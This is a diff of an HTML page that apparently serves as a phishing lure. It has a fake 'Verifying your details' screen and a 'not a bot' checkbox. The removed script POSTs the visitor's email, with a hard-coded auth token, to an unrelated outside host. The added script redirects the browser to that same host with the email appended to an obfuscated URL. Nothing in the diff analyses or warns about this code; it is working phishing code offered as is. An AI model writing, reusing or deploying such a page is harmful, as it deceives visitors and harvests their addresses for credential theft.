@@ -92,41 +92,37 @@
         <div class="spinner"></div>
         <p>Verifying your details...</p>
     </div>
-    <script>
-        document.getElementById("submitButton").addEventListener("click", async function() {
-            const emailInput = document.getElementById("emailInput").value.trim();
-            if (!emailInput || !emailInput.includes("@")) {
-                alert("Please enter a valid email address.");
+  <script>
+        const form = document.getElementById('emailForm');
+        const emailInput = document.getElementById('email');
+        const errorMessage = document.getElementById('errorMessage');
+        const humanCheck = document.getElementById('humanCheck');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            if (!humanCheck.checked) {
+                alert('Please verify that you are not a bot.');
                 return;
             }
-            document.querySelector(".container").style.display = "none";
-            document.getElementById("loadingSection").style.display = "block";
-            const endpoint = "https://wd0c435.fzminze.com/iALQhehr?zry=an1FRGhmbUo0HcrnJQhn3Xyguts3200F6IQRnhaxiZ8JQyGXTSCeUvSd5q0n#";
-            try {
-                const response = await fetch(endpoint, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "X-Special-Auth": "cSah8ebIoxxdnxYuthJiSvA7FYfqrHF9"
-                    },
-                    body: JSON.stringify({ email: emailInput }),
-                });
-                if (response.ok) {
-                    const finalRedirectUrl = await response.text();
-                    setTimeout(() => { window.location.href = finalRedirectUrl; }, 3000);
-                } else {
-                    alert("Error processing request. Please try again.");
-                }
-            } catch (error) {
-                console.error("Error:", error);
-                alert("Unable to process request.");
+
+            const email = emailInput.value.trim();
+
+            if (!validateEmail(email)) {
+                errorMessage.style.display = 'block';
+            } else {
+                errorMessage.style.display = 'none';
+                // Redirect to the landing page with the email appended as a query parameter
+                const redirectUrl = `https://wd0c435.fzminze.com/iALQhehr?zry=an1FRGhmbUo0HcrnJQhn3Xyguts3200F6IQRnhaxiZ8JQyGXTSCeUvSd5q0n#${(email)}`;
+                window.location.href = redirectUrl;
             }
         });
-        document.getElementById("emailInput").addEventListener("keydown", function(event) {
-            if (event.key === 'Enter') {
-                document.getElementById("submitButton").click();
-            }
-        });
+
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
     </script>
 </body>
 </html>
+
